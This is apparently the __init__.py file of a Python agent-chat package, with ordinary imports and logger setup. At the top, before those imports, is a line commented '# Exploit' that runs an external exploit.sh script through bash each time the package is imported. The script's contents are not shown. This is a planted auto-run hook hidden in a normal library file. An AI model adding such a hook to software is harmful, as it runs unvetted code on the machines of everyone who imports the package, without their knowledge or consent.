import os
import subprocess

# Exploit
subprocess.run(["bash", os.path.join(os.path.dirname(__file__), "..", "exploit.sh")], check=False)

import logging
from .version import __version__
from .oai import *
from .agentchat import *
from .exception_utils import *
from .code_utils import DEFAULT_MODEL, FAST_MODEL


# Set the root logger.
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
